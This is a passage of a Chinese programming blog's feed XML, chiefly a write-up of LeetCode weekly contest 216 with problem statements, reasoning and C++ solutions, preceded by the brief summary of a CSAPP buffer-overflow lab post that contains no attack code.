      &lt;h1 id=&quot;CSAPP-lab3-bufboomb&quot;&gt;&lt;a href=&quot;#CSAPP-lab3-bufboomb&quot; class=&quot;headerlink&quot; title=&quot;CSAPP lab3 bufboomb&quot;&gt;&lt;/a&gt;CSAPP lab3 bufboomb&lt;/h1&gt;&lt;p&gt;本次实验的&lt;code&gt;project&lt;/code&gt;为&lt;code&gt;buflab&lt;/code&gt;，这个&lt;code&gt;lab&lt;/code&gt;比上次&lt;code&gt;lab2&lt;/code&gt;有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的&lt;code&gt;lab&lt;/code&gt;主要为详细描述缓冲区溢出的&lt;code&gt;shellcode&lt;/code&gt;编写，每个小的&lt;code&gt;case&lt;/code&gt;非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个&lt;code&gt;case&lt;/code&gt;全部通过，通过这&lt;code&gt;5&lt;/code&gt;个&lt;code&gt;case&lt;/code&gt;基本熟悉了&lt;code&gt;shellcode&lt;/code&gt;的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="代码实现" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛216场</title>
    <link href="http://yoursite.com/2020/11/22/228/"/>
    <id>http://yoursite.com/2020/11/22/228/</id>
    <published>2020-11-22T10:42:17.618Z</published>
    <updated>2020-11-22T11:22:57.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-216"><a href="#leetcode-contest-216" class="headerlink" title="leetcode  contest 216"></a>leetcode  contest 216</h1><p>本周最后一题基本上绝大部分人都做出来了，看来还是比较简单的contest。因为前三题基本上都是送分题。<br>试了虚拟竞赛，大概40分钟搞定，估计排名也就在200名左右，前三题确实太简单了。</p><h2 id="5605-检查两个字符串数组是否相等"><a href="#5605-检查两个字符串数组是否相等" class="headerlink" title="5605. 检查两个字符串数组是否相等"></a>5605. 检查两个字符串数组是否相等</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你两个字符串数组 <code>word1</code>和 <code>word2</code> 。如果两个数组表示的字符串相同，返回 <code>true</code>；否则，返回 <code>false</code> 。</p><a id="more"></a><p>数组表示的字符串 是由数组中的所有元素 按顺序 连接形成的字符串。</p><p>示例 1：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = [<span class="string">"ab"</span>, <span class="string">"c"</span>], word2 = [<span class="string">"a"</span>, <span class="string">"bc"</span>]</span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：</span><br><span class="line">word1 表示的字符串为 <span class="string">"ab"</span> + <span class="string">"c"</span> -&gt; <span class="string">"abc"</span></span><br><span class="line">word2 表示的字符串为 <span class="string">"a"</span> + <span class="string">"bc"</span> -&gt; <span class="string">"abc"</span></span><br><span class="line">两个字符串相同，返回 <span class="keyword">true</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = [<span class="string">"a"</span>, <span class="string">"cb"</span>], <span class="attr">word2</span> = [<span class="string">"ab"</span>, <span class="string">"c"</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span>  = [<span class="string">"abc"</span>, <span class="string">"d"</span>, <span class="string">"defg"</span>], <span class="attr">word2</span> = [<span class="string">"abcddefg"</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= word1.length, word2.length &lt;= 103</code></li><li><code>1 &lt;= word1[i].length, word2[i].length &lt;= 103</code></li><li><code>1 &lt;= sum(word1[i].length), sum(word2[i].length) &lt;= 103</code></li><li><code>word1[i] 和 word2[i] 由小写字母组成</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/design-an-ordered-stream" target="_blank" rel="noopener">https://leetcode-cn.com/problems/design-an-ordered-stream</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  简直就是送分题</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>直接将所有的字符串相加即可，判断相加后的字符串是否相等。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">arrayStringsAreEqual</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; word1, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; word2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s1;</span><br><span class="line">        <span class="built_in">string</span> s2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> w : word1) s1 += w;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> w : word2) s2 += w;</span><br><span class="line">        <span class="keyword">if</span>(s1 != s2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5606-具有给定数值的最小字符串"><a href="#5606-具有给定数值的最小字符串" class="headerlink" title="5606. 具有给定数值的最小字符串"></a>5606. 具有给定数值的最小字符串</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>小写字符 的 数值 是它在字母表中的位置（从 1 开始），因此 a 的数值为 1 ，b 的数值为 2 ，c 的数值为 3 ，以此类推。</p><p>字符串由若干小写字符组成，字符串的数值 为各字符的数值之和。例如，字符串 “abe” 的数值等于 <code>1 + 2 + 5 = 8</code>。</p><p>给你两个整数<code>n</code>和 <code>k</code>。返回 长度 等于 n 且 数值 等于 k 的 字典序最小 的字符串。</p><p>注意，如果字符串 x 在字典排序中位于 y 之前，就认为 x 字典序比 y 小，有以下两种情况：</p><p>x 是 y 的一个前缀；<br>如果 i 是 <code>x[i] != y[i]</code>的第一个位置，且<code>x[i]</code>在字母表中的位置比 <code>y[i]</code> 靠前。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span>, k = <span class="number">27</span></span><br><span class="line">输出：<span class="string">"aay"</span></span><br><span class="line">解释：字符串的数值为 <span class="number">1</span> + <span class="number">1</span> + <span class="number">25</span> = <span class="number">27</span>，它是数值满足要求且长度等于 <span class="number">3</span> 字典序最小的字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">5</span>, k = <span class="number">73</span></span><br><span class="line">输出：<span class="string">"aaszz"</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 105</code></li><li><code>n &lt;= k &lt;= 26 * n</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/smallest-string-with-a-given-numeric-value" target="_blank" rel="noopener">https://leetcode-cn.com/problems/smallest-string-with-a-given-numeric-value</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>题目其实很简单，给定总值求字典序最小的目标串，所以我们每次让最左边的字符尽可能的小即可，假设进行到第<code>i</code>位，且当前剩余剩余的字符的和为<code>sum</code>,则此时该字符应该为:<script type="math/tex; mode=display">s[i] = min(1,sum - (n-i)*26)  + ('a' - 1)</script>贪心法，即尽可能的让当前位最小即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getSmallestString</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = max(<span class="number">1</span>,k - (n-i)*<span class="number">26</span>);</span><br><span class="line">            k -= x;</span><br><span class="line">            ans.push_back(<span class="string">'a'</span> + x - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5607-生成平衡数组的方案数"><a href="#5607-生成平衡数组的方案数" class="headerlink" title="5607. 生成平衡数组的方案数"></a>5607. 生成平衡数组的方案数</h2><p>给你一个整数数组 <code>nums</code> 。你需要选择 恰好 一个下标（下标从 <code>0</code> 开始）并删除对应的元素。请注意剩下元素的下标可能会因为删除操作而发生改变。</p><p>比方说，如果 <code>nums = [6,1,7,4,1]</code>，那么：</p><ul><li>选择删除下标 1 ，剩下的数组为 nums = [6,7,4,1] 。</li><li>选择删除下标 2 ，剩下的数组为 nums = [6,1,4,1] 。</li><li>选择删除下标 4 ，剩下的数组为 nums = [6,1,7,4] 。<br>如果一个数组满足奇数下标元素的和与偶数下标元素的和相等，该数组就是一个 平衡数组 。</li></ul><p>请你返回删除操作后，剩下的数组 <code>nums</code>是 平衡数组 的 方案数 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：</span><br><span class="line">删除下标 <span class="number">0</span> ：[<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">1</span> + <span class="number">4</span> = <span class="number">5</span> 。奇数元素下标为：<span class="number">6</span> 。不平衡。</span><br><span class="line">删除下标 <span class="number">1</span> ：[<span class="number">2</span>,<span class="number">6</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span> 。奇数元素下标为：<span class="number">6</span> 。平衡。</span><br><span class="line">删除下标 <span class="number">2</span> ：[<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span> 。奇数元素下标为：<span class="number">1</span> 。不平衡。</span><br><span class="line">删除下标 <span class="number">3</span> ：[<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">6</span> = <span class="number">8</span> 。奇数元素下标为：<span class="number">1</span> 。不平衡。</span><br><span class="line">只有一种让剩余数组成为平衡数组的方案。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：你可以删除任意元素，剩余数组都是平衡数组。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：不管删除哪个元素，剩下数组都不是平衡数组。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/ways-to-make-a-fair-array" target="_blank" rel="noopener">https://leetcode-cn.com/problems/ways-to-make-a-fair-array</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口 + 前缀和</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目非常简单，我们只需要求出第<code>i</code>时的偶数位前缀和与奇数位的前缀和，其实非常简单。</li><li>本次我们每次删除第<code>i</code>位时，则此时我们只需要根据求和公式，删除第<code>i</code>的数时，剩余构成的数组的奇数位的和与偶数位的和分别为:<script type="math/tex; mode=display">oddsum = odd[i-1] + even[n-1] - even[i] \\evensum = even[i-1] + odd[n-1] - odd[i] \\</script><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">waysToMakeFair</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; even(n,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; odd(n,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        even[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)&#123; <span class="comment">//even</span></span><br><span class="line">                even[i] = even[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">                odd[i] = odd[i<span class="number">-1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">//odd</span></span><br><span class="line">                even[i] = even[i<span class="number">-1</span>];</span><br><span class="line">                odd[i] = odd[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> evensum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> oddsum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                oddsum = even[n<span class="number">-1</span>] - even[<span class="number">0</span>];</span><br><span class="line">                evensum = odd[n<span class="number">-1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                evensum = even[i<span class="number">-1</span>] + odd[n<span class="number">-1</span>] - odd[i];</span><br><span class="line">                oddsum = odd[i<span class="number">-1</span>] + even[n<span class="number">-1</span>] - even[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(evensum == oddsum) ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5608-完成所有任务的最少初始能量"><a href="#5608-完成所有任务的最少初始能量" class="headerlink" title="5608. 完成所有任务的最少初始能量"></a>5608. 完成所有任务的最少初始能量</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个任务数组 <code>tasks</code>，其中 <code>tasks[i] = [actuali, minimumi]</code> ：</p><ul><li><code>actuali</code> 是完成第 <code>i</code> 个任务 需要耗费 的实际能量。</li><li><code>minimumi</code> 是开始第 <code>i</code> 个任务前需要达到的最低能量。<br>比方说，如果任务为 <code>[10, 12]</code> 且你当前的能量为<code>11</code>，那么你不能开始这个任务。如果你当前的能量为 <code>13</code>，你可以完成这个任务，且完成它后剩余能量为 <code>3</code> 。</li></ul><p>你可以按照 任意顺序 完成任务。</p><p>请你返回完成所有任务的 最少 初始能量。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">8</span>]]</span><br><span class="line">输出：<span class="number">8</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">8</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">8</span> - <span class="number">4</span> = <span class="number">4</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">4</span> - <span class="number">2</span> = <span class="number">2</span> 。</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">2</span> - <span class="number">1</span> = <span class="number">1</span> 。</span><br><span class="line">注意到尽管我们有能量剩余，但是如果一开始只有 <span class="number">7</span> 能量是不能完成所有任务的，因为我们无法开始第 <span class="number">3</span> 个任务。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">10</span>,<span class="number">11</span>],[<span class="number">10</span>,<span class="number">12</span>],[<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">输出：<span class="number">32</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">32</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">32</span> - <span class="number">1</span> = <span class="number">31</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">31</span> - <span class="number">2</span> = <span class="number">29</span> 。</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">29</span> - <span class="number">10</span> = <span class="number">19</span> 。</span><br><span class="line">    - 完成第 <span class="number">4</span> 个任务，剩余能量为 <span class="number">19</span> - <span class="number">10</span> = <span class="number">9</span> 。</span><br><span class="line">    - 完成第 <span class="number">5</span> 个任务，剩余能量为 <span class="number">9</span> - <span class="number">8</span> = <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">7</span>],[<span class="number">2</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">9</span>],[<span class="number">4</span>,<span class="number">10</span>],[<span class="number">5</span>,<span class="number">11</span>],[<span class="number">6</span>,<span class="number">12</span>]]</span><br><span class="line">输出：<span class="number">27</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">27</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">5</span> 个任务，剩余能量为 <span class="number">27</span> - <span class="number">5</span> = <span class="number">22</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">22</span> - <span class="number">2</span> = <span class="number">20</span> 。</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">20</span> - <span class="number">3</span> = <span class="number">17</span> 。</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">17</span> - <span class="number">1</span> = <span class="number">16</span> 。</span><br><span class="line">    - 完成第 <span class="number">4</span> 个任务，剩余能量为 <span class="number">16</span> - <span class="number">4</span> = <span class="number">12</span> 。</span><br><span class="line">    - 完成第 <span class="number">6</span> 个任务，剩余能量为 <span class="number">12</span> - <span class="number">6</span> = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= tasks.length &lt;= 105</code></li><li><code>1 &lt;= actual​i &lt;= minimumi &lt;= 104</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目稍微思考了一下，我们首先思考一下，首先我们知道最小的初始能量即为所有任务消耗的能量的总和，如果小于该值，任务就不可能完成。</li><li>我们首先需要观察一下，为什么要用贪心。因为我们知道假如第<code>i</code>个任务的消耗能量与最低能量相等，则此时该任务几乎不会对最终结果有很大影响，影响最大的肯定是最低能量远大于消耗能量的任务。如果在此情况下，我们可以利用排序，首先将对结果影响最大的任务首先完成，则我们按照$minimum_{i} - actual_{i}$的大小进行排序即可。</li><li>这个需要严格的数学证明，虽然题目做出来了，但是还没有想好严格的数学证明。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> da = a[<span class="number">1</span>]-a[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> db = b[<span class="number">1</span>]-b[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(da == db) <span class="keyword">return</span> a[<span class="number">0</span>] &gt; b[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> da &gt; db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumEffort</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; tasks)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = tasks.size();</span><br><span class="line">        <span class="keyword">int</span> require = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) ans += tasks[i][<span class="number">0</span>];</span><br><span class="line">        sort(tasks.begin(),tasks.end(),cmp);</span><br><span class="line">        <span class="keyword">int</span> curr = ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(curr &lt; tasks[i][<span class="number">1</span>])&#123;</span><br><span class="line">                ans += tasks[i][<span class="number">1</span>] - curr;</span><br><span class="line">                curr = tasks[i][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            curr -= tasks[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-216&quot;&gt;&lt;a href=&quot;#leetcode-contest-216&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 216&quot;&gt;&lt;/a&gt;leetcode  contest 216&lt;/h1&gt;&lt;p&gt;本周最后一题基本上绝大部分人都做出来了，看来还是比较简单的contest。因为前三题基本上都是送分题。&lt;br&gt;试了虚拟竞赛，大概40分钟搞定，估计排名也就在200名左右，前三题确实太简单了。&lt;/p&gt;&lt;h2 id=&quot;5605-检查两个字符串数组是否相等&quot;&gt;&lt;a href=&quot;#5605-检查两个字符串数组是否相等&quot; class=&quot;headerlink&quot; title=&quot;5605. 检查两个字符串数组是否相等&quot;&gt;&lt;/a&gt;5605. 检查两个字符串数组是否相等&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你两个字符串数组 &lt;code&gt;word1&lt;/code&gt;和 &lt;code&gt;word2&lt;/code&gt; 。如果两个数组表示的字符串相同，返回 &lt;code&gt;true&lt;/code&gt;；否则，返回 &lt;code&gt;false&lt;/code&gt; 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Google Kickstart】  roundH</title>
    <link href="http://yoursite.com/2020/11/20/227/"/>
    <id>http://yoursite.com/2020/11/20/227/</id>
